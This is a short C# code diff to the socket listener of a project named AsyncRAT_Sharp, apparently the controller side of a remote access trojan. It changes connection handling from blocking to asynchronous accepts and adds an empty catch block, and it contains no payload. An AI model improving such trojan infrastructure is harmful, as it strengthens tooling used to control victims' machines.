@@ -1,6 +1,7 @@
 ﻿using System.Threading.Tasks;
 using System.Net;
 using System.Net.Sockets;
+using System;
 
 namespace AsyncRAT_Sharp.Sockets
 {
@@ -22,9 +23,20 @@ namespace AsyncRAT_Sharp.Sockets
                 await Task.Delay(1);
                 if (listener.Pending())
                 {
-                    Clients CL = new Clients();
-                    CL.InitializeClient(listener.AcceptSocket());
+                    listener.BeginAcceptSocket(EndAccept, null);
                 }
+            }
+        }
+
+        public void EndAccept(IAsyncResult ar)
+        {
+            try
+            {
+                Clients CL = new Clients();
+                CL.InitializeClient(listener.EndAcceptSocket(ar));
+            }
+            catch
+            {
             }
         }
     }
